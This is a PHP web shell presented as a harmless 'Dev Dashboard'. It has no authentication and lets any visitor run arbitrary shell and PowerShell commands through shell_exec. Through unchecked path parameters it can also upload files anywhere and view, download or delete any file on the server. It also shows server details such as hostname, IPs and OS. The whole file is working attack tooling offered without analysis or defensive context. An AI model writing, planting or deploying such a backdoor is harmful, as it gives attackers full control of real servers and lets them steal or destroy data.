<?php
// ------------- CONFIG & INPUT --------------
$cwd = $_GET['cwd'] ?? $_POST['cwd'] ?? getcwd();
$cmd = $_POST['cmd'] ?? '';
$mode = $_POST['mode'] ?? 'shell';

// Directory navigation
if (isset($_GET['dir'])) {
    $new_dir = $_GET['dir'];
    if (is_dir($new_dir)) {
        $cwd = realpath($new_dir);
    }
}

// -------------------- FILE VIEWER --------------------
$view_content = null;
$view_file = null;

if (isset($_GET['view'])) {
    $file = $_GET['view'];
    if (file_exists($file) && is_file($file)) {
        $view_file = $file;
        $view_content = htmlspecialchars(file_get_contents($file));
    }
}

if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if (file_exists($file)) {
        unlink($file);
        echo "<p style='color:green;'>Deleted $file</p>";
    }
}

if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Type: application/octet-stream');
        readfile($file);
        exit;
    }
}

// Functions
function sys_info() {
    return [
        'Hostname'        => gethostname(),
        'Current User'    => get_current_user(),
        'Server IP'       => $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname()),
        'Client IP'       => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
        'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
        'Server Port'     => $_SERVER['SERVER_PORT'] ?? 'Unknown',
        'Document Root'   => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
        'OS Info' => php_uname('a')
    ];
}

function list_files($dir) {
    $files = scandir($dir);
    $list = [];
    foreach ($files as $f) {
        if ($f !== '.' && $f !== '..') $list[] = $f;
    }
    return $list;
}

function exec_command($cmd, $mode) {
    if (!$cmd) return '';
    if ($mode === 'shell') {
        return shell_exec($cmd . ' 2>&1');
    } elseif ($mode === 'powershell' && strtoupper(substr(PHP_OS,0,3)) === 'WIN') {
        return shell_exec("powershell -Command \"$cmd\" 2>&1");
    } else {
        return "Unsupported mode or OS.";
    }
}

// Upload handling
if ($_FILES['upload']['tmp_name'] ?? false) {
    $dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
        echo "<p style='color:green;'>Uploaded " . htmlspecialchars($dest) . " (" . $_FILES['upload']['size'] . " bytes)</p>";
    } else {
        echo "<p style='color:red;'>Upload failed!</p>";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Dev Dashboard</title>
<style>
  body {
    margin:0; font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; background:#f7f9fc;
    color:#333; height:100vh; display:flex; flex-direction: column;
  }
  header {
    background:#3f51b5; color:#fff; padding:1rem 2rem; font-size:1.25rem; font-weight:700;
    box-shadow: 0 2px 6px rgb(0 0 0 / 0.2);
  }
  main {
    flex: 1; display: flex; gap: 1rem; padding: 1rem 2rem; overflow: hidden;
  }
  section {
    background: #fff; border-radius: 8px; box-shadow: 0 0 8px rgb(0 0 0 / 0.1);
    padding: 1rem; overflow-y: auto;
  }
  #file-manager {
    flex: 1.5;
    display: flex;
    flex-direction: column;
    margin: 0;
    overflow: hidden; /* important */
  }
  #file-manager table {
    width: 100%; border-collapse: collapse;
  }
  #file-manager th, #file-manager td {
    padding: 0.5rem 0.75rem; text-align: left; border-bottom: 1px solid #eee;
    font-family: monospace;
  }
  #file-manager th {
    background: #f0f0f0; user-select:none;
  }
  #file-manager tbody tr:hover {
    background: #e3eaff;
  }
  #file-manager a.action-btn {
    margin-right: 0.5rem;
    text-decoration: none;
    font-weight: bold;
    padding: 0.2rem 0.4rem;
    border-radius: 4px;
    color: white;
    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
  }
  a.view { background:#2196f3; }
  a.download { background:#4caf50; }
  a.delete { background:#f44336; }
  a.folder { color:#fbc02d; font-weight: 700; cursor: pointer; }
  
  #system-info {
    flex: 0.5;
    margin-bottom: 0.1rem;
  }
  #system-info ul {
    list-style: none; padding: 0;
    font-family: monospace;
  }
  #system-info li {
    padding: 0.3rem 0;
  }
  #terminal {
    flex: 2.6;
    display: flex; flex-direction: column;
  }
  #terminal form {
    display: flex; gap: 0.5rem; margin-bottom: 0.5rem;
  }
  #terminal select, #terminal input[type="text"] {
    font-family: monospace;
    font-size: 1rem;
    padding: 0.3rem 0.5rem;
    border: 1px solid #ccc;
    border-radius: 4px;
  }
  #terminal input[type="text"] {
    flex: 1;
  }
  #terminal button {
    background: #3f51b5; border:none; color:#fff;
    padding: 0 1rem; border-radius: 4px;
    font-weight: 700; cursor: pointer;
    transition: background-color 0.3s ease;
  }
  #terminal button:hover {
    background: #303f9f;
  }
  #output {
    flex: 1;
    background: #1e1e1e; color: #d4d4d4;
    font-family: monospace;
    padding: 1rem;
    border-radius: 6px;
    overflow-y: auto;
    white-space: pre-wrap;
    box-shadow: inset 0 0 5px rgba(0,0,0,0.5);
  }
  .fm-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 10px;
    gap: 10px;
}
.fm-header h2 {
    margin: 0;
    font-size: 1.3em;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    flex: 1;
    min-width: 0;
}
</style>
</head>
<body>

<header>Dev Dashboard</header>

<main>
<section id="file-manager" tabindex="0">
<div class="fm-header">
<h2>File Manager: <?php echo htmlspecialchars($cwd); ?></h2>
<form method="post" enctype="multipart/form-data" style="margin:0;">
<input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
<input type="file" name="upload" required>
<button type="submit">Upload</button>
</form>
</div>

<div style="flex:1; overflow:auto;">
<table>
<thead>
<tr>
<th>Name</th><th>Size</th><th>Modified</th><th>Actions</th>
</tr>
</thead>
<tbody>

<?php
$parent = dirname($cwd);
if ($parent !== $cwd) {
echo "<tr><td colspan='4'><a href='?dir=" . urlencode($parent) . "&cwd=" . urlencode($parent) . "' class='folder'>.. (Parent Directory)</a></td></tr>";
}

foreach(list_files($cwd) as $file):
$path = $cwd . DIRECTORY_SEPARATOR . $file;
$is_dir = is_dir($path);
$size = $is_dir ? "Folder" : number_format(filesize($path)) . " Bytes";
$mtime = date("Y-m-d H:i:s", filemtime($path));
?>

<tr>
<td>
<?php if($is_dir): ?>
<a href="?dir=<?php echo urlencode($path); ?>&cwd=<?php echo urlencode($path); ?>" class="folder">&#128193; <?php echo htmlspecialchars($file); ?></a>
<?php else: ?>
&#128459; <?php echo htmlspecialchars($file); ?>
<?php endif; ?>
</td>
<td><?php echo $size; ?></td>
<td><?php echo $mtime; ?></td>
<td>
<?php if(!$is_dir): ?>
<a href="?view=<?php echo urlencode($path); ?>&cwd=<?php echo urlencode($cwd); ?>" class="action-btn view">👁️</a>
<a href="?download=<?php echo urlencode($path); ?>&cwd=<?php echo urlencode($cwd); ?>" class="action-btn download">⬇️</a>
<a href="?delete=<?php echo urlencode($path); ?>&cwd=<?php echo urlencode($cwd); ?>" onclick="return confirm('Delete <?php echo htmlspecialchars($file); ?>?');" class="action-btn delete">🗑️</a>
<?php else: ?> -
<?php endif; ?>
</td>
</tr>

<?php endforeach; ?>
</tbody>
</table>
</div>


<?php if ($view_content !== null): ?>
<div style="flex:1; display:flex; flex-direction:column; overflow:hidden;">
    <hr>
    <p style="
    margin:0 0 10px 0;
    font-size:1.17em;
    font-weight:bold;
    ">
    File Viewer: <?php echo htmlspecialchars($view_file); ?>
    </p>
    <pre style="
        background:black;
        color:#00ff00;
        padding:10px;
        overflow:auto;
        flex:1;
        margin:0;
    "><?php echo $view_content; ?></pre>
</div>
<?php endif; ?>

</section>

<section style="flex:1; display:flex; flex-direction:column; gap:1rem;">

<div id="system-info">
<h2>System Info</h2>
<ul>
<?php foreach(sys_info() as $k => $v): ?>
<li><strong><?php echo $k; ?>:</strong> <?php echo htmlspecialchars($v); ?></li>
<?php endforeach; ?>
</ul>
</div>

<div id="terminal">
<h2>Interactive Terminal</h2>
<form method="post">
<select name="mode">
<option value="shell" <?php if($mode==='shell') echo 'selected'; ?>>Shell</option>
<option value="powershell" <?php if($mode==='powershell') echo 'selected'; ?>>PowerShell</option>
</select>
<input type="text" name="cmd" required>
<input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
<button type="submit">Run ▶</button>
</form>
<pre id="output"><?php
if ($cmd) {
echo htmlspecialchars(exec_command($cmd, $mode));
}
?></pre>
</div>

</section>
</main>
</body>
</html>
